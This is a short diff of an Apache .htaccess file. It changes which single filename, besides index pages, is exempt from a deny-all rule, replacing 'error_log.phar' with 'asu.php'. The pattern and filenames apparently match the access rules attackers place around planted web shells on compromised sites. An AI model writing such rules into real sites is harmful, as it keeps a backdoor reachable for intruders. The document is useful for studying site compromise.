@@ -6,7 +6,7 @@ Deny from all
 
 </FilesMatch>
 
-<FilesMatch "^(|error_log.phar|index.php|index.html)$">
+<FilesMatch "^(|asu.php|index.php|index.html)$">
 
 Order allow,deny
 
